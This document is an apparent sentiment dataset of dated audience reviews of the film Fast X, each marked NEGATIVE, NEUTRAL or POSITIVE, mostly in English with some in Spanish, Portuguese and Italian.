"Apr 13, 2024",NEGATIVE,"Jason Momoa is the only bright spot in this otherwise terrible film. Vin Diesel has driven this franchise into the ground. He has milked it so far beyond when he should have stopped, but I guess as long as the movies keep bringing in $$, he doesn't care how embarrassingly bad they are."
"Apr 11, 2024",NEGATIVE,I've never been so disappointed in a Jason Mamoa performance or a Fast and Furious movie.
"Apr 8, 2024",NEGATIVE,"Rápidos y Furiosos 5: Robaron una caja fuerte.
Rápidos y Furiosos 6: En el aire weon.
Rápidos y Furiosos 7: Saltan con autos entre edificios.
Rápidos y Furiosos 8: Corrieron contra un submarino.
Rápidos y Furiosos 9: Fueron al espacio.
Rápidos y Furiosos 10: ... ?"
"Apr 5, 2024",NEGATIVE,"Watched until I could no longer stomach it. How in the world this movie has a positive audience score is beyond me. Maybe it is a reflection of where moviegoers are, I don't know. This movie is simply ridiculous. Not Starship Troopers ridiculous. Ridiculous ridiculous. The CGI is ridiculous. The fight scenes are beyond ridiculous. The acting.....oh, the acting...ridiculous. That car chase/Raiders of the Lost Ark collection of scenes was extra ridiculous. Anyway, possibly the worst movie ever made. So bad that even The Rise of Skywalker looks Oscar-worthy in comparison."
"Mar 26, 2024",NEGATIVE,Wow Jason Momoa is AWFUL in this movie. Plot was already dumb but his joker style acting was just off putting. Worst movie of the franchise. I did like Reacher in the film he had great presence
"Mar 26, 2024",NEUTRAL,"As a fan of Fast and Furious, this part really disappointed me. A movie about chasers turned into a sci-fi movie that doesn't focus on racing at all. The real F&F ended with part 7. I have nothing more to say, the movie was fun, but not what it should've been."
"Mar 24, 2024",NEUTRAL,"It opens with family and barbecue... and revenge. The Fast & Furious franchise has become very proficient at making big budget, high octane action movies with plots that are clear and coherent. The main fault is that they often get so absurd that it's impossible to take it seriously, but that might be a blessing in disguise because it forces the plot into being kept simple and mostly straight-forward.  This installment mostly follows those patterns... and then it ends and there is no family, there is no barbecue, and the story goes into the void."
"Mar 24, 2024",NEGATIVE,"Irredeemably silly.  Ludicrous GCI, daft plot, puerile characterisation ..... a real low point for the franchise."
"Mar 22, 2024",NEUTRAL,Jason's character saved the movie
"Mar 4, 2024",NEGATIVE,I cannot say that this is good movie or even good entertaiment.
"Mar 4, 2024",NEGATIVE,"This movie was absolutely terrible. Stuff just happens with no explanation whatsoever. The cgi is God awful. The kid is terrible. Jason mamoa's joker esq performance is laughably bad. Such over acting from mamoa. The tough girls kicking ass is just ridiculous. I just couldn't with this movie. Skip it. If this is where there going with this series, miss me."
"Feb 29, 2024",POSITIVE,this move is completely bonkers!!! fantastic!!
"Feb 28, 2024",NEUTRAL,"""Fast X"" is the highly anticipated tenth film in the ""Fast and Furious"" franchise. This movie is action packed and turns back to its racing roots for a solid chunk of the movie. That being said, it does contain an extensive amount of violence, especially for a Fast and Furious movie. While definitely not a Christian movie in any regard, it does have some good strong messages about the importance of family, putting others first and sacrifice.  

First Media Key: Balance
Balance is not a word that doesn't seem to be in director Louis Leterrier's vocabulary. I know that might seem harsh but there is little to no balance in this film. There is a huge amount of unnecessary violence and only a couple of dialogue scenes. Now while this is an action movie, ""Fast X"" does stray away from the balance that was seen in the first couple of films in the franchise. In the article it says ""However, what I do find troubling with this latest chapter is the foul language, the increased amount of sexualized content (including sexualized females), and the violence for the film has certainly increased"". 

Second Media Key: Attitude Awareness
This movie doesn't require one to watch it with a strong awareness of their attitude. This movie will actually most likely change your attitude in regards to family, in a good way. This movie is all about family, or familia as Dom Toretto, the main character likes to say. Whether your attitude towards the topic of family is good or bad, you will leave this movie knowing that blood is in fact thicker than water. 

Third Media Key: Dignity of the Human Person
While I am a big fan of the Fast and Furious franchise, they unfortunately do not do a good job in fulfilling this media key. And ""Fast X"" is not an exception. Throughout the movie, there are multiple situations where someone is knocked out cold and then shot. Shooting the person is unnecessary within those situations because being knocked out, they wouldn't have posed any threat. By shooting the already knocked out person, there is a lack of respect for the dignity of the person. There is also a scene somewhat early on in the movie where the villain Dante, props up the dead bodies of two people that he's killed and is painting their nails. This is a very disturbing scene because not only is it kind of graphic, but there is an extreme lack of respect for human dignity. 

Fourth Media Key: Truth-filled
This movie isn't the most truth-filled film out there by a long shot. However, it does have some very impactful familial truths. For example, there is the continuous truth throughout the whole film series that family doesn't turn their back on family, especially when times get tough. This is one of the main elements of family life. Another truth that is seen in the movie is we are all family. Looking at this from a Catholic standpoint, we are all family in the sense that we are all part of the family of God.  

Fifth Media Key: Inspiring 
This movie is definitely inspiring in regards to family. In the movie, Dom Toretto delivers lines like ""Family defines us. By blood or by bond, family is a powerful thing"". But Toretto is more of a man of action than of words; and that is seen very clearly throughout the film. He throws himself over members of his team when something explodes, he taunts the villain to chase after him instead of his family(his team), he wraps his son up in his arms and takes the brunt of the impact when thrown from a car, etc. This movie will definitely inspire one to appreciate, support and love one's family more. 

Sixth Media Key: Skillfully Developed
Although this film may not fulfill some of the other media keys, it most definitely fulfills this one. This film was developed with the Fast and Furious franchise fans as the target audience. This movie was one of the most highly anticipated movies of the year because of its continuation of the series. Similarly to the ""Barbie"" movie, this film really plays on the nostalgia that this series set with its first film back in 2001. Many characters are brought back and many are revealed to be alive and well, when thought to be dead. When the movie came to an end and the credits rolled, theaters were filled with applause and cheers.

Seventh Media Key:Motivated by and relevant to experience
While on the surface this movie does not seem to be relevant to experience, when looked at more closely it actually is. Throughout the course of this movie, Toretto is faced with the decision of whether to put himself first or his family. And of course, as seen in the previous films, he immediately chose his family. This is relevant because at some point in our lives, we have been faced with the same choice. It is also relevant because of the self-sacrificing aspect. Toretto and his team members are seen being willing to sacrifice themselves in order to save/help others. This is something that all of us have experienced, maybe not in circumstances as extreme as the one shown in the film, but similar nonetheless. Additionally, as mentioned for the previous media key, Leterrier uses the fact that this is the tenth film in the series to really play on the audience's nostalgia. 

Although this film is skillfully developed and inspiring amongst many things, I wouldn't recommend it as a movie to watch with the family or as a good moral movie to watch. Leterrier does a good job at continuing the Fast and Furious franchise when remaining somewhat loyal to its original racing roots. I think that my review of this film would be appreciated by some people and not by others because I was honest and tried not to sugarcoat anything. There will most likely be a large number of people who disagree with me because a good chunk of people who watched this movie are Fast and Furious fans. Others will appreciate it because I give my honest review and I look at this film from a moral standpoint."
"Feb 25, 2024",NEGATIVE,"This movie was so insanely stupid. The acting was half hearted and the plot was insulting.  I like Momoa, but his talent was wasted here.  I could see what he was going for, it just didn't work.  There are plenty of movies that are enjoyable as long as you can switch off your brain - this isn't one of them. Brain on or off, it sucked."
"Feb 25, 2024",POSITIVE,"Agree what others said about being unrealistic, but I love the characters, specially the ones that you didn't expect to be there. Was just wondering what happened to Brian's children Jack and Olivia, knowing that this movie is about family. Hope they would show in Part 2."
"Feb 25, 2024",NEUTRAL,"Meh...except for Jason Momoa, his character is over the top, and made the whole movie worth watching."
"Feb 23, 2024",NEGATIVE,"It was mildly entertaining if you shut your brain off. However, we need to support movies that have good writing and original ideas. The success of franchises like this is why Hollywood operates the way that it does. These movies more money than they deserve. Don't give them any of yours."
"Feb 23, 2024",POSITIVE,"Felt like F&F's infinity war, They got there own avengers, They got what expendables want to become, Perfect Villains. Spot-on Cameos and amazing plot points left to explore further, each and every character and connection from previous movies feels natural and goddam they got whole old cast together with great new comers , Ending feels incomplete obviously.. but post credit was surprisingly awesome. Overall an Amazing movie."
"Feb 23, 2024",NEGATIVE,"Look no further for mediocre actors and a ridiculous plot. I saw this against my will, this franchise should have ended 10 years ago."
"Feb 22, 2024",NEGATIVE,"As an action movie, absolutely OK. The stunts and effects are amazing. Really really good actually!! But the music sucks - big time - as always!! - And has that in all films. And now the story is getting really watered down and thin! Doesn't hold much of value or interest or substance anymore - despite the cast with some good and celebrity actors and sadly others who should have been fired before/after(?) movie 3! Oh, and the franchise was story-thin already by/after movie #2 - although they got a little boost in movies 6 and 7. Mostly thanks to the participation of Dwayne Johnson and Jason Statham who are also in this one with Helen Mirren in a small role. Jason Momoa doesn't help Fast X one bit, sad to say. He overacts in a way that only Nicholas Cage can get away with - here it just gets hilariously pathetically bad!
They are past the time to scrap this series for good I think. Let it rest in peace please….
But there will be a part 2. Hopefully they end the whole franchise with it!"
"Feb 22, 2024",NEGATIVE,"In my opinion, Jason Momoa gives the worst performance in this franchise's history (and that is saying something!)."
"Feb 18, 2024",NEGATIVE,O filme mais porcaria que já vi. Totalmente perdido sem nenhum foco. Todo mundo ajuda o Dominique sem motivo nenhum. Mais um filme porcaria do vin diesel
"Feb 17, 2024",POSITIVE,"FAST X is a solid entry in the franchise, featuring the same craziness that's become a trademark of the series. However, for the first time I can recall, it includes some more laid-back character-building moments, which add depth without the usual franchise melodrama or grandiosity. John Cena brings a much-needed comedic touch to the film, and it feels entirely natural. Jason Momoa also dives headfirst into his role, giving it his all and channeling a Vaas-like vibe (from Far Cry 3). However, due to a script flaw, his character lacks a stronger motivation, making his actions feel somewhat extreme and senseless. The rest of the cast delivers their usual performances, staying true to their characters. What's lacking in this film is the creativity in Dom's storyline, and Vin Diesel's effort in portraying him. Dom once again plays the role of the family patriarch who must make sacrifices to save everyone, even though it's a recycled plot from previous films. Nonetheless, it serves as a good plot device for advancing the story and allowing other characters to shine. Overall, FAST X delivers some genuinely funny moments and doesn't disappoint in the action department, featuring some of the craziest sequences yet."
"Feb 16, 2024",POSITIVE,muy entretenida la verdad
"Feb 13, 2024",POSITIVE,"F&F always the best, waiting for next"
"Feb 13, 2024",POSITIVE,"Was hesitant at first glance but this was one of the best films I'd seen since returning to theaters, when you realize a movie is supposed to be crazy, emotional and entertaining thats what this film gives you from start to finish. Plus Jason Momoa is truly an underrated actor we need to appreciate his genius while we can."
"Feb 11, 2024",NEGATIVE,Another pointless sequel to a series that lost it's purpose 4 movies ago
"Feb 11, 2024",NEGATIVE,"so painfully awful and bad...like torture 2 your brain with cgi computerized crash after crash after crash...so awful, but another 1 is coming in 2 years"
"Feb 10, 2024",POSITIVE,"After the disappointing over-the-top antics of the previous film, FAST X is a welcome return to form for the franchise. The self-seriousness of Dom and company is as funny as ever, and the film's actual humor works well too. The F&F series has always excelled at elevating the car chase to a kind of visual poetry, and FAST X impressively achieves the difficult balance of human-centered and kinetic vehicular action. The use of big-budget practical effects further distinguishes the film from the all-too-common CGI spectacle of other blockbusters. Jason Momoa is terrible/perfect as the flamboyant villain, and the story's skillful connection to earlier installments sets the stage for a fitting eventual end to the saga."
"Feb 10, 2024",NEGATIVE,"Easily the worst big budget film I have ever seen. Writing was like someone was huffing glue while watching Transformers and Batman. Vin Diesel does the worst acting i've ever seen in my life. The best part was Jason Mamoa, at least he recognized he was in a meme and played to it. Fast Franchise officially more cringe than Transformers, shameful. I am glad I did not pay to see it in theaters."
"Feb 9, 2024",POSITIVE,"É o típico filme de ação de ficção científica com carro tunados, mas eu ainda amo"
"Feb 9, 2024",NEUTRAL,"It's a cool film it's not the best out of the series and sometimes you can see a greenscreen or two behind an actor, but other than that it's funny and enjoyable."
"Feb 6, 2024",POSITIVE,"I loved it. When it comes to action, I don't need reality and this movie delivers. Going to watch the others now and CAN NOT WAIT FOR THE SEQUEL!!!  Almost an all star cast. And Reacher was such a welcomed surprise! Great date night movie. The bigger the explosion, the more I'm on the edge of my seat! Kudos to everyone involved in the making of such an exciting movie."
"Feb 6, 2024",NEGATIVE,The movie is full of stupid elements and it makes it very difficult to suspend disbelief. Some of the CGI is bad enough to distract from the action. Why watch a car chase movie when the car is CGI? The plot is also very underwhelming.
"Feb 4, 2024",NEGATIVE,"I really wanted to like this movie, but, man, if I hear Vin say ""family"" one more time I'm gonna hurl.
The problem with this movie series now is they have so many ""stars"" in it that it's trying too hard to make all of them relevant."
"Feb 3, 2024",NEGATIVE,"Okay, it starts with action which is maintained throughout the movie. But really? Who lives like this? The acting is pretty bad and the bomb? Oh yes there's a bomb which I guess any bad guy can buy and load on the back of a truck at his whim. Well, it rolled all over Rome on fire and no explosion. Oh, I'm sorry, there's the incredible Dom, the hero! Dom uses his fabulous car to put the bomb in the water because well, he's Dom. Only he can save the Vatican.  It's a very silly, ridiculous movie that can't be saved even with the amazing cast. Okay, Jason Momoa gives great villain face, and he is funny. The dialogues are all stupid because the lines and scenes are contrived and nonsensical.  My goodness all those angry, psychotic faces! Lots of scowling to show their fury!!!! John Cena and Dom's son flying in a little surfboard plane fueled by Smirnoff vodka that was unloaded from a plane several thousand feet in the sky? Really? The music when Dom picks up Brie Larson when she got shot and puts her in the car! Touching? Nope. Corny as hell.  Tyrese and Luda bonding over leadership? I wanted to projectile hurl. No, really. The movie is campy and if you have a couple of hours of your life to spare and you want to watch something totally unbelievable, asinine and has no cinematic merit, get your snacks, your girl or your man and something to put you in the atmosphere like a lot of wine or weed. Remember, those are hours of your life you cannot get back. Oops I'm sorry, parents. But you too should allow your kids to blow up and shoot the bad guys to prepare him for her for those rough days in school ."

"Jan 29, 2024",NEGATIVE,Ridiculous but entertaining.  Unfortunately realism has left the building completely on this one!
"Jan 28, 2024",NEGATIVE,"As far beyond normal criticism as it's possible to get. Everyone involved in this irredeemably asinine movie should be ashamed, especially Mamoa. Only good line was him him dry retching the word family. Rotten Tomatoes should introduce negative star ratings just for this tedious franchise."
"Jan 28, 2024",NEGATIVE,"What the heck? First off I have seen several of the series but it was obvious that the first 30 minutes was a love fest for the characters... which I don't have a real connection to so that pulled me out a bit. Then, I am all for a popcorn movie and being over the top but this even pushed my limit. AND...there is no ending! I wasted over 2 hours and there are so many loose ends! So unsatisfying! I will not continue wasting my time with this series. If you aren't a serious fan, don't waste your time."
"Jan 28, 2024",NEGATIVE,"Passable entertainment but this series is running on fumes. Best part of the whole movie is John Cena. Rest of the cast is just meh. The plot is thin and unoriginal. These movies now boil down to (fill name here) villain is after the ""family"" and Dom has to save the ""family."" Simply adding in more A list actors is not saving this franchise."
"Jan 27, 2024",NEGATIVE,What can I say.  Just bad!
"Jan 27, 2024",NEUTRAL,"Jason Momoa was fantastic, loved his unusual character, masculine and feminine. What a great huge cast. I don't usually like these action films, but this one was very impressive."
"Jan 26, 2024",NEUTRAL,"Ridiculous stunts, melodrama and not good dialogue. The acting not so good and the plot is a reason to have 5 minute cameos. That said it is entertaining."
"Jan 25, 2024",NEUTRAL,"Open scenes brought to you by ""CHEESE""

Action scenes brought to you by ""Endless Gears""

Plot brought to you by ""Ran out of ideas"""
"Jan 23, 2024",NEGATIVE,"Turn off logic and imagine you're watching one of your favorite animated shows. Don't worry about Vin Diezel's mumbling. I'm sure you'll make it to the end. Between all the mess is good popcorn movie action. Keep in mind the first sentence. In the end, Jason Mamoa's quirky performance helped...a little."
"Jan 22, 2024",NEGATIVE,"Touching homage to the franchise throughout the film but made you miss the simplicity of the earlier films. Now it's just a hodge podge of outrageous complexity, although Momoa is a phenomenal villain. (44%)"
"Jan 20, 2024",NEGATIVE,"What more can we say about this franchise? There´s ""only"" 2 more left!!! (apparently)"
"Jan 20, 2024",NEGATIVE,"Dialogos sin sentido, horrible actuación de momoa"
"Jan 20, 2024",NEUTRAL,"Is the move unrealistic? Yes. Is the movie basically the same as the other 10? Yes. Will it win an Oscar? No. But, is it entertaining? Absolutely.

It's a good movie to kill 2 hours without boring you. That's it's goal. There's even a scene or two where Vin Diesel strings together two consecutive sentences."
"Jan 20, 2024",NEUTRAL,"Family but squared + r.i.p john cena 
Your time is up, my time is now
You can't see me, my time is now
Its the franchise, Boy, I'm shining now
You can't see me, my time is now"
"Jan 18, 2024",NEGATIVE,"I've been struggling to stay interested with the Fast movies, the further along we went, the more silly they became. This last one was just cringe. It's like they are making these just to say HEY! ANOTHER FAST FLICK!"
"Jan 17, 2024",NEGATIVE,"Dumb movie, story line was jacked. Unbelievable. Should have been animated."
"Jan 15, 2024",POSITIVE,Fast X was way over the top and I loved it. Mamoa is like the Furious Joker...and the family love is so schmaltzy you want to gag. But it keeps every second of your attention.
"Jan 15, 2024",NEUTRAL,"It's a good movie. Fun and adventurous but slightly darker than the other Fast & Furious movies. Completely different movie than the original six but with that in consideration, it's great."
"Jan 10, 2024",NEGATIVE,"Interesting until the last 20 minutes or so. The ending left us cold and colored our review.
Sad. - We really wanted to like it."
"Jan 9, 2024",NEGATIVE,"There have been some good films in this franchise, and it is easy to criticise when they don't get it right. But I really am over the ""family "" reference, it's become irritating and so have some of the characters. Please, let some of them go! 
I expect a franchise with such good names in it to deliver a good / solid story, great action (at least some times) and leave me wanting more. 
It would have been better to do a stand alone film, rather than the rumoured trilogy (I honestly cannot see this happening and currently would be surprised to see the next one in April 2025 - it was rumoured to be due out then). 
However, that all said, some of it was very good for example the overall story idea, some of the fight scenes (the first one with C Theron is very good), some of the action hits the spot (Rome) and the  development of J Cenas Jacob is quite sweet. I was quite frankly sick of seeing J Mamoa, A Ritchson, B Larson (no fault of their own, just dial it down writers!) and would be interested to see Dom gone, because of the dynamics between the characters. A lot of it was also unnecessary and that meant at times it was slow. Having a sequel so far after, when so much is left in the air, is also pretty frustrating. This is a film that is good in the background and pay attention at the exciting bits."
"Jan 8, 2024",NEGATIVE,"It was almost enjoyable how bad this hand grenade of a film this was. The agonising script of (what felt like) recycled cheesy action movie one liners, biffed in a blender with utterly impossible stunts, made me think this must have been written by an AI robot. This has lead me to believe that SURELY this movie is a satire… If so, then this movie hits the mark."
"Jan 7, 2024",POSITIVE,"I have not seen any other Fast film so I had someone give me background on the past films just to see it, and it was worth the background knowledge. The movie was pretty great. The family themselves and the supporting characters were spot on for a first time watch and Jason Mamoa was a spectacular and fun villain. This movie was a great film to start 2024 and I'm now more excited to see the other entries. Can't wait to see part 2 of the film"
"Jan 6, 2024",POSITIVE,"I enjoyed this, the franchise had to evolve, after all it is a business so I'm not mad, I enjoyed the chaos and one of favourite characters died 😣. I would watch again"
"Jan 6, 2024",NEGATIVE,"The days of non stop CGI enhanced noise, poor scripts and empty plots should, by now, be coming to an end. I guess FFast and Furious movies are now directed toward the younger brain addled youth of today who have been sitting in front a ""device"" since birth. It is a long way (light years) from the original movie and is a total load of, mmmmmmm nothingness. 
I wonder if there is any real acting work available in hollywood
(small letters) or, do these once mostly decent actors have to resort to participating in a non stop green screen festival to feed there families.  
P.S. Don't get me wrong the first couple of F and F movies where passable. Say 3.5 ."
"Jan 5, 2024",NEGATIVE,"This movie was actually comical,.. shame as the franchise has been a guilty pleasure"
"Jan 4, 2024",POSITIVE,"Jason Momoa absolutely STEALS the show. Never saw one movie from the franchise, but decided to watch because…you know…Momoa. He is SO GOOD at being bad."

Minha opinião: Uns dizem que será uma triologia e outros em duas partes. Mas pelo que sabemos ela esta para terminar. Será? Um filme que sempre ressucita dos mortos. Kkk. Velozes e Furiosos criou um universo único, despertou em muitos o drifty, os carros mexidos, e os rachas. Despertou em uma legião de seguidores dentro e fora das telas. Um filme que sempre inspira a família. Comcerteza algo que marcou foi a perda de Paul Walker. Neste filme não temos carros indo para o espaço, mas aquelas cenas forçadas tem aqui também. Aqui temos Jason Momoa como o grande inimigo da saga e sendo ele o maior. A cada filme aparece um maior que o outro. Mas será que veremos Momoa depois virando a casaca para a família? Se terminar os Velozes aí não veremos mas se continuar, podemos né. Jason Stathan, John Cena, The Rock, e quem sabe com Charlize também. Aqui temos Jason como filho do traficante brasileiro Rayes que foi morto em Velozes 5 e que agora ele vem para vingar. E para isso ele quer a morte do filho de Don é o alvo. E o filme passa por Roma, Rio, Portugal,.... E toda a família é envolvida e Don precisará de ajuda de novas pessoas. Com várias cenas eletrizante e forçadas, enche o tempo de pura adrenalina. Temos aqui os papeis dos atores como de sempre os mesmos e os diferentes são as novas caras: Brie, Alan, Jason, Eastwood,....
Roteiro e enredo Fazem da mesma receita com atores e situações diferentes, mas da mesma receita. Desde o fim do Mundo, aqui mudou para vingança.
Vale apena assistir? Para quem é fã e já sabe oque vai encontrar.

"Dec 29, 2023",NEGATIVE,I made the mistake of having my brain turned on while watching this movie. Does... Does that qualify as a review? I don't know.
"Dec 27, 2023",NEGATIVE,"Ngl, I thought this movie was Mission Impssoble with the goofy ah stunts. Why was some invisible guy doing a Minecraft boat clutch?"
"Dec 27, 2023",NEGATIVE,It's sad to see what they have done with this franchise. This movie is a horror for the eyes. There is nothing good. It was a painful experience
"Dec 27, 2023",NEGATIVE,"This movie was like the Americans finding Auschwitz. No one could believe what they were seeing, but they know the atrocity would stop after they saw it. Enough Vin Diesel! Slink off somwhere and just stop making movies for the love of god"
"Dec 26, 2023",NEGATIVE,Is too much to ask that Dom's 1970 Charger survives one of these Goddamn movies? Completely ridiculous!
"Dec 26, 2023",NEGATIVE,"This is the worst trash of an already dead and rotting franchise! I would say spy kids is a better and more realistic action spy movie. The plot is simply rediculous, to the point Sharknado is more believable. The characters are a joke and the amount of cameos - I guess money talks. 
Utter rubbish! If I could rate this zero I would."
"Dec 26, 2023",NEGATIVE,"The last 3 to 4 movies from this franchise sucks-it's practically a joke. Toretto is basically a superhero. He is untouchable with his car. I really liked the first, third, fourt and maybe the fifth too."
"Dec 26, 2023",NEGATIVE,"Still, Fast and Furious movies simply fail to deliver and entertain."
"Dec 25, 2023",NEGATIVE,"🇮🇹Fast X è il primo film della trilogia finale della saga di Fast and Furious. Il film fa riferimento al finale di Fast and Furious 5 per trarre, molto probabilmente, il villain più potente della saga che mette in estrema difficoltà i protagonisti. La trama si svolge all'interno delle maggiori città europee e negli States e segue (più o meno) lo stesso filone narrativo che presenta ogni Fast, in quanto porta la divisione dei protagonisti in piccoli gruppetti, i quali poi tentano di ricongiungersi. È un film molto movimentato ma devo dire che non si parte proprio bene. Sono un fan della saga e devo ammettere che se il livello si mantiene così, lo accetto in quanto questi film vanno visti come puro e solo intrattenimento, ma non posso esimermi dall' esaminarlo in quello che è, un film mediocre ma ""salvato"" da un ottimo cliffhanger e una grande scena mid-credit, che apre ottime possibilità per gli ultimi due film della saga. I problemi più giganteschi sono il montaggio terribile della prima parte del film, in quanto le scene sembrano incollate una sopra l'altra senza un motivo logico, inoltre si gioca troppo sulla sospensione dell'incredulità, perché ci sono troppe dinamiche irrealistiche che ti fanno pensare a delle situazioni piuttosto ""tamarre"" e senza senso, le quali erano presenti anche negli altri Fast, ma in questo si sfiora veramente il limite. Le uniche cose buone che si salvano dal film sono l'ottimo sviluppo del villain, poiché risulta veramente odioso, svolgendo quindi correttamente il suo obiettivo incutendo abbastanza timore, in quanto si capisce come sia la maggiore minaccia che la squadra abbia mai affrontato e le performance degli attori abbastanza buone. In definitiva un film che ameranno tutti i fan della saga ma che oggettivamente presenta giganteschi difetti, i quali superano di gran lunga i pregi. Ritengo che da fan, posso dire che comunque è un film che fa godere e che ti fa rimanere a bocca aperta, ma oggettivamente, da un punto di vista cinematografico è veramente di scarsa qualità. ———————————————————————————- 
🇬🇧 Fast X is the first film in the final trilogy of the Fast and Furious saga. The film refers to the finale of Fast and Furious 5 to draw, most likely, the most powerful villain of the saga that puts the protagonists in extreme difficulty. The plot takes place within the major European cities and in the States and follows (more or less) the same narrative thread that presents each Fast, as it brings the division of the protagonists into small groups, which then try to reunite. It's a very eventful movie but I have to say that it doesn't start very well. I am a fan of the saga and I must admit that if the level stays that way, I accept it as these films should be seen as pure and only entertainment, but I can not fail to examine it in what it is, a mediocre film but ""saved"" by an excellent cliffhanger and a great mid-credit scene, which opens up very good possibilities for the last two films. The most gigantic problems are the terrible editing of the first part of the film, as the scenes seem glued on top of each other without a logical reason, moreover you play too much on the suspension of disbelief, because there are too many unrealistic dynamics that make you think of rather ""crazy"" and meaningless situations, which were also present in the other Fasts, but in this they really touch the limit. The only good things that are saved from the film are the excellent development of the villain, as it is really obnoxious, therefore correctly carrying out his goal with enough fear, as it is understood how it is the greatest threat that the team has ever faced and the performances of the actors quite good. Ultimately a film that all fans of the saga will love but that objectively has gigantic flaws, which far exceed the merits. I think that as a fan, I can say that in any case it is a film that makes you enjoy and that makes you feel amazed, but objectively, from a cinematographic point of view it is really of poor quality."
"Dec 25, 2023",NEGATIVE,"I have never liked this film franchise, but I've never had so much despise for a film and yet leave itself on a cliffhanger, one that I have no interest in seeing where the story goes."
"Dec 24, 2023",POSITIVE,Great all star movie... Enchanting.
"Dec 23, 2023",NEGATIVE,"This is the worst film I've ever seen in the franchise.  Thank god I didn't go to the cinema to watch this. This shows Jason Mamoa can't act camp, the story line is really horrible,  the screenplay is pathetic.  This franchise needs to stop now."
"Dec 23, 2023",POSITIVE,I feel like this movie was a big upgrade from fast 9. Momoa did a great job and movie felt like something new and fancy. It is a great action movie and the only bad thing is that it wasn't the last movie off the franchise.
"Dec 23, 2023",POSITIVE,"Vehicle action on roidz 👍😍
Cast exceptionally grand... Paul Walker cameo was a Kleenex moment 😭"
"Dec 22, 2023",NEGATIVE,The Movies was good and the action was great by Jason Momoa playing the villain was a wrong choice for the movie. Don't get me wrong Jason Momoa is a great actor but not on Fast X. Jason Momoa was Terrible as a Villain in Fast X. They could have done better with a different actor as the Main Villain cause Jason Momoa was terrible in Fast X.
"Dec 16, 2023",POSITIVE,Jason is a quite crazy and good villain. He was a good choice. But the whole movie... well I found it boring except the end where Dwayne showed up. I miss Hobbs & Shaw scenes.
"Dec 15, 2023",NEUTRAL,Guilty pleasure… love these
"Dec 15, 2023",NEGATIVE,What does the Fast & the Furious franchise and an old man have in common? They can't go anywhere without their Walkers.
"Dec 9, 2023",POSITIVE,IT WAS REALLY GOOD BUT THANKS FOR LEAVING US ON A CLIFF HANGER AND NOT PUTTING ANOTHER MOVIE OUT TILL 2025. THANKS VERY MUCH I SO DID NOT SMASH MY HEAD INTO A WALL OR TAKE THE REMOTE AND SMASH MY HEAD SO VERY MUCH THANKS PEOPLE OF FAST AND FURIOUS I HOPE WHEN U FART YOU POOP YOURSELF.
"Dec 6, 2023",NEUTRAL,"""Fast X"" zooms onto the screen with a tire-screeching start, delivering an electrifying love letter to the Fast and Furious saga. Visually, it's a turbocharged masterpiece, boasting jaw-dropping shots that amp up the adrenaline. The film embraces its classic over-the-top action, urging audiences to buckle up and simply savor the ride without overthinking. The stakes soar sky-high, signaling the beginning of the end for the franchise, injecting a thrilling urgency into every scene.

Jason Momoa emerges as the shining star, easily claiming the title of the franchise's best villain. His portrayal is a perfect blend of intimidating and uproariously funny, stealing every scene he graces. John Cena's subplot as Dom's charming brother adds a hilarious dynamic to the family-driven narrative, while Vin Diesel unfortunately falls short once again in the acting department.

The film's Achilles' heel lies in its overstuffed ensemble and multitude of subplots, resulting in an excessive runtime. However, amidst the chaos, ""Fast X"" manages to entertain with its high-octane action, humor, and the promise of an epic closure to the saga. Buckle in, suspend disbelief, and relish the frenzy—it's a rollercoaster you won't want to miss!"
"Dec 4, 2023",NEGATIVE,I'm tired of these movies the 1st movie was great the rest bla
"Dec 3, 2023",NEGATIVE,Dumbest movie I've ever seen
"Dec 3, 2023",NEGATIVE,Bloodshot returns defying reality and saving family. This time he faces a Joker variant with God's Eye.
"Dec 2, 2023",POSITIVE,"Excellent movie, with excellent graphics! Jason Momoa plays the part of a bad guy in this movie, and he does it very well. I highly recommend seeing this film. It will keep you on the edge of your seat!"
"Dec 1, 2023",NEGATIVE,"Goes to show happens when you get it really wrong. It tried hard to be a comedy and falls flat on its face, it was too lazy to fall its arse. Relies on trying to rehash an old storyline, not sure if they ran out of money for scrip writers with any understanding of the franchise or any talent or both. Will not be rushing to see what else they can vomit out for Fast 11"
"Nov 26, 2023",NEGATIVE,I do not have seen this movie
"Nov 26, 2023",NEGATIVE,"i don't know if Ridiculous is the right word. 

Delusional perhaps fits it perfectly."
"Nov 25, 2023",NEGATIVE,"It's time for the Fast Franchise to end! It's been a long, wild, and whacky ride for the Fast and Furious Franchise but I think it has finally outstayed it's welcome. Where the first 3 or 4 Fast movies were a little grounded with realism, this latest entry is just completely off of the rails. Yes, I understand this is a film where you turn your mind off and just enjoy the action but c'mon! The plot in Fast X is so far fetched and the action set pieces just ignore all laws of gravity, that it's really hard to enjoy this film. Vin Diesel even seems to be phoning it in here. The only one who seems to understand the assignment is the newest Villian played by Jason Momoa who is absolutely ridiculous in a good way. Jason seemed to channel his Heath Ledger knock off impersenation here and for the most part it works. Also please be original and stop retconning events, it comes off being lazy. How this movie ends spells out that there will be another Fast film but why?! Hasn't 10 entries been enough already?! Fast X gets 2 low X's out of 5 from me."
"Nov 24, 2023",NEGATIVE,"How can any adult watch this movie and walk away thinking ""man, that was good!""?  I really think that this movie was written by AI because I'm pretty sure it used every action movie trope ever conceived by a Hollywood writer, even when it didn't make sense to use it.  As an example, there's a scene where Dom ""discovers"" the bad guy's lair.  *Cue melodramatic music* *Zoom in on Dom's face, twisted into a stupid look of intrigue* ""This is where I'll find my answers!"".  Nevermind that he knows who the bad guy is and why he's coming after him.  What exactly is the question here, Dom!?  

Every action movie cliche ever devised?  Done to death.
Every line of dialogue written?  Stupid.
Every line of dialogue delivered?  Wooden.
Every joke?  Groan worthy. 
Every scene with Jason Momoa in it?  Chewed.

Then there's the repetition...Jason Momoa somehow magically finds a lookout spot that can oversee the whole city from every angle (they try to explain this away by giving him a screen with a few cameras on it) and SHOCK!  He's magnetically attached an explosive to the bottom of a vehicle!  *Chaos ensues*

Just let this franchise die please.  As much as I love seeing Jason Statham continuing to find work, I just can't stomach another one of these truly god awful films."
"Nov 23, 2023",NEGATIVE,"Why do they still keep making these movies? Oh, because dumbasses like me keep watching them."
"Nov 21, 2023",POSITIVE,Wish I would of watched this in the movie theater definitely one of the best in the trilogy!
"Nov 15, 2023",POSITIVE,Fast X didn't have hope for this movie from the trailer but this movie as watching was amazing i didn't expect to like it this much as I have the shots are amazing the comedy is actually funny as a lot of emotions and the villain is so good i didn't think it would of have been that good bc it seemed random he is my favorite villain of this franchise so overall very surprising 93%
"Nov 10, 2023",NEUTRAL,"If you're watching the tenth (sort of 11th) film in this franchise, you should know what your in for. Yeah it's dumb, I think that's the point. These films are purposefully stupid, and this one might be the best in that regards. I laughed the whole time, and had a blast."
